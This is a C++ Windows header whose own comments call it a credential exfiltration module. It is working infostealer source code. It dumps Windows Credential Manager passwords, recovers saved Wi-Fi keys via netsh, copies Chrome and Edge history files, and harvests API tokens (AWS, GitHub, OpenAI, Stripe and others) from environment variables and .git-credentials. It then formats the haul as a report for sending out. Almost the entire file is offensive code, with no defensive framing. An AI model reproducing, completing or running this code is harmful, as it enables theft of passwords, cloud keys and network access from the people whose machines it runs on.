#pragma once

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <WinCred.h>
#include <Shlobj.h>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>

#pragma comment(lib, "credui.lib")
#pragma comment(lib, "Shell32.lib")

namespace nuub::domain {

// Credential entry structure
struct CredentialEntry {
    std::string target;
    std::string username;
    std::string password;
    std::string source;  // "browser", "wifi", "credential_manager", "browser_history"
};

// Credential exfiltration module
// Extracts saved credentials from various sources
class CredentialExfil {
public:
    // ── 1. Windows Credential Manager ──────────────────────────
    static std::vector<CredentialEntry> extract_windows_credentials() {
        std::vector<CredentialEntry> results;

        PCREDENTIALW* pCredential = nullptr;
        DWORD count = 0;
        DWORD flags = CRED_ENUMERATE_ALL_CREDENTIALS;

        if (CredEnumerateW(nullptr, flags, &count, &pCredential)) {
            for (DWORD i = 0; i < count; ++i) {
                CredentialEntry entry;
                entry.source = "credential_manager";

                // Target
                if (pCredential[i]->TargetName) {
                    int len = WideCharToMultiByte(CP_UTF8, 0, pCredential[i]->TargetName, -1,
                                                  nullptr, 0, nullptr, nullptr);
                    if (len > 0) {
                        entry.target.resize(len - 1);
                        WideCharToMultiByte(CP_UTF8, 0, pCredential[i]->TargetName, -1,
                                           entry.target.data(), len, nullptr, nullptr);
                    }
                }

                // Username
                if (pCredential[i]->UserName) {
                    int len = WideCharToMultiByte(CP_UTF8, 0, pCredential[i]->UserName, -1,
                                                  nullptr, 0, nullptr, nullptr);
                    if (len > 0) {
                        entry.username.resize(len - 1);
                        WideCharToMultiByte(CP_UTF8, 0, pCredential[i]->UserName, -1,
                                           entry.username.data(), len, nullptr, nullptr);
                    }
                }

                // Password (blob)
                if (pCredential[i]->CredentialBlob && pCredential[i]->CredentialBlobSize > 0) {
                    if (pCredential[i]->Type == CRED_TYPE_GENERIC ||
                        pCredential[i]->Type == CRED_TYPE_DOMAIN_PASSWORD) {
                        DWORD wchar_count = pCredential[i]->CredentialBlobSize / sizeof(wchar_t);
                        std::wstring wpass(
                            reinterpret_cast<const wchar_t*>(pCredential[i]->CredentialBlob),
                            wchar_count);

                        int len = WideCharToMultiByte(CP_UTF8, 0, wpass.c_str(), -1,
                                                      nullptr, 0, nullptr, nullptr);
                        if (len > 0) {
                            entry.password.resize(len - 1);
                            WideCharToMultiByte(CP_UTF8, 0, wpass.c_str(), -1,
                                               entry.password.data(), len, nullptr, nullptr);
                        }
                    }
                }

                if (!entry.username.empty() || !entry.password.empty()) {
                    results.push_back(std::move(entry));
                }
            }
            CredFree(pCredential);
        }

        return results;
    }

    // ── 2. WiFi Saved Passwords ────────────────────────────────
    static std::vector<CredentialEntry> extract_wifi_passwords() {
        std::vector<CredentialEntry> results;

        // Execute netsh to get profiles
        FILE* pipe = _popen("netsh wlan show profiles 2>&1", "r");
        if (!pipe) return results;

        std::vector<std::string> profiles;
        char buffer[4096];
        while (fgets(buffer, sizeof(buffer), pipe)) {
            std::string line(buffer);
            // Parse "Perfil de All Users    : MyWiFi"
            auto pos = line.find(":");
            if (pos != std::string::npos) {
                std::string value = line.substr(pos + 1);
                // Trim
                while (!value.empty() && value[0] == ' ') value.erase(0, 1);
                while (!value.empty() && value.back() == '\n') value.pop_back();
                while (!value.empty() && value.back() == '\r') value.pop_back();
                if (!value.empty() && value != "All" && value != "None") {
                    // Filter out header lines
                    if (value.find("profiles") == std::string::npos &&
                        value.find("Profile") == std::string::npos &&
                        value.find("---") == std::string::npos) {
                        profiles.push_back(value);
                    }
                }
            }
        }
        _pclose(pipe);

        // Get password for each profile
        for (const auto& profile : profiles) {
            std::string cmd = "netsh wlan show profile name=\"" + profile + "\" key=clear 2>&1";
            pipe = _popen(cmd.c_str(), "r");
            if (!pipe) continue;

            CredentialEntry entry;
            entry.source = "wifi";
            entry.target = profile;

            while (fgets(buffer, sizeof(buffer), pipe)) {
                std::string line(buffer);

                // Look for "Key Content" or "Contenido de la clave"
                if (line.find("Key Content") != std::string::npos ||
                    line.find("Contenido de la clave") != std::string::npos) {
                    auto pos = line.find(":");
                    if (pos != std::string::npos) {
                        std::string password = line.substr(pos + 1);
                        while (!password.empty() && password[0] == ' ') password.erase(0, 1);
                        while (!password.empty() && password.back() == '\n') password.pop_back();
                        while (!password.empty() && password.back() == '\r') password.pop_back();
                        entry.password = password;
                    }
                }
            }
            _pclose(pipe);

            if (!entry.password.empty()) {
                results.push_back(std::move(entry));
            }
        }

        return results;
    }

    // ── 3. Browser History URLs ─────────────────────────────────
    // Note: Actual password extraction requires SQLite decryption
    // This extracts browser history for reconnaissance
    static std::vector<CredentialEntry> extract_browser_history() {
        std::vector<CredentialEntry> results;

        // Chrome history path
        char appdata[MAX_PATH]{};
        SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, appdata);

        std::string chrome_history = std::string(appdata) +
            "\\Google\\Chrome\\User Data\\Default\\History";

        // Check if file exists
        DWORD attr = GetFileAttributesA(chrome_history.c_str());
        if (attr == INVALID_FILE_ATTRIBUTES) return results;

        // Copy to temp (Chrome locks the file)
        std::string temp_history = std::string(appdata) + "\\temp_history_copy";
        if (!CopyFileA(chrome_history.c_str(), temp_history.c_str(), FALSE)) {
            return results;
        }

        // Try to read as SQLite (basic extraction)
        std::ifstream ifs(temp_history, std::ios::binary);
        if (ifs.is_open()) {
            // Read first page to verify SQLite header
            char header[16]{};
            ifs.read(header, 16);

            if (strncmp(header, "SQLite format 3", 15) == 0) {
                CredentialEntry entry;
                entry.source = "browser_history";
                entry.target = "Chrome";
                entry.username = "history_db_copied";
                entry.password = temp_history;
                results.push_back(std::move(entry));
            }
        }

        // Also check Edge
        std::string edge_history = std::string(appdata) +
            "\\Microsoft\\Edge\\User Data\\Default\\History";
        attr = GetFileAttributesA(edge_history.c_str());
        if (attr != INVALID_FILE_ATTRIBUTES) {
            std::string temp_edge = std::string(appdata) + "\\temp_edge_history_copy";
            if (CopyFileA(edge_history.c_str(), temp_edge.c_str(), FALSE)) {
                CredentialEntry entry;
                entry.source = "browser_history";
                entry.target = "Edge";
                entry.username = "history_db_copied";
                entry.password = temp_edge;
                results.push_back(std::move(entry));
            }
        }

        return results;
    }

    // ── 4. Environment Variables (API keys, tokens) ────────────
    static std::vector<CredentialEntry> extract_env_credentials() {
        std::vector<CredentialEntry> results;

        const char* sensitive_vars[] = {
            "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
            "AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET",
            "GITHUB_TOKEN", "GITHUB_PAT",
            "SLACK_TOKEN", "DISCORD_TOKEN",
            "OPENAI_API_KEY", "ANTHROPIC_API_KEY",
            "HUGGING_FACE_HF_TOKEN",
            "NPM_TOKEN", "PYPI_TOKEN",
            "DATABASE_URL", "REDIS_URL",
            "STRIPE_SECRET_KEY", "PAYPAL_CLIENT_SECRET",
            nullptr
        };

        for (int i = 0; sensitive_vars[i] != nullptr; ++i) {
            char value[4096]{};
            DWORD size = sizeof(value);
            if (GetEnvironmentVariableA(sensitive_vars[i], value, size)) {
                if (strlen(value) > 0) {
                    CredentialEntry entry;
                    entry.source = "environment";
                    entry.target = sensitive_vars[i];
                    entry.username = sensitive_vars[i];
                    entry.password = value;
                    results.push_back(std::move(entry));
                }
            }
        }

        return results;
    }

    // ── 5. Git Credentials ─────────────────────────────────────
    static std::vector<CredentialEntry> extract_git_credentials() {
        std::vector<CredentialEntry> results;

        char home[MAX_PATH]{};
        SHGetFolderPathA(nullptr, CSIDL_PROFILE, nullptr, 0, home);

        std::string gitconfig = std::string(home) + "\\.gitconfig";
        std::ifstream ifs(gitconfig);
        if (ifs.is_open()) {
            std::string line;
            CredentialEntry entry;
            entry.source = "git";

            while (std::getline(ifs, line)) {
                // Trim whitespace
                while (!line.empty() && (line[0] == ' ' || line[0] == '\t'))
                    line.erase(0, 1);

                if (line.find("user") == 0) {
                    // Could extract username from here
                }
            }
        }

        // Check for credential helper store
        std::string credentials_store = std::string(home) + "\\.git-credentials";
        DWORD attr = GetFileAttributesA(credentials_store.c_str());
        if (attr != INVALID_FILE_ATTRIBUTES) {
            std::ifstream cred_file(credentials_store);
            if (cred_file.is_open()) {
                std::string line;
                while (std::getline(cred_file, line)) {
                    if (!line.empty()) {
                        CredentialEntry entry;
                        entry.source = "git_credentials";
                        entry.target = line;
                        entry.username = "stored_credential";
                        entry.password = line;
                        results.push_back(std::move(entry));
                    }
                }
            }
        }

        return results;
    }

    // ── Combined extraction ─────────────────────────────────────
    static std::vector<CredentialEntry> extract_all() {
        std::vector<CredentialEntry> all;

        auto windows_creds = extract_windows_credentials();
        all.insert(all.end(), windows_creds.begin(), windows_creds.end());

        auto wifi_creds = extract_wifi_passwords();
        all.insert(all.end(), wifi_creds.begin(), wifi_creds.end());

        auto env_creds = extract_env_credentials();
        all.insert(all.end(), env_creds.begin(), env_creds.end());

        auto git_creds = extract_git_credentials();
        all.insert(all.end(), git_creds.begin(), git_creds.end());

        return all;
    }

    // Format credentials as text for exfiltration
    static std::string format_credentials(const std::vector<CredentialEntry>& creds) {
        std::ostringstream oss;
        oss << "=== Credential Report ===\n\n";

        for (const auto& c : creds) {
            oss << "Source: " << c.source << "\n";
            oss << "Target: " << c.target << "\n";
            oss << "User:   " << c.username << "\n";
            oss << "Pass:   " << c.password << "\n";
            oss << "---\n";
        }

        oss << "Total: " << creds.size() << " credentials found\n";
        return oss.str();
    }
};

} // namespace nuub::domain
#endif
